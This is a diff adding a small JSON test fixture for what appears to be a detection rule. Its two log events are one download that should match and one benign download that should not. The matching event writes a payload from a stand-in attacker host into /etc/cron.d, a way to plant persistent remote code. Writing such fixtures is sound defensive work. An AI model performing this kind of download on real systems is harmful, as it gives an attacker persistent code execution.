@@ -1,0 +1,4 @@
+[
+  {"expect_match": true, "event": {"Message": "module=image.download params={\"output_dir\":\"/etc/cron.d\",\"url\":\"http://attacker.example/payload\"}"}},
+  {"expect_match": false, "event": {"Message": "module=image.download params={\"output_dir\":\"/sandbox/tmp\",\"url\":\"http://cdn.example/logo.png\"}"}}
+]
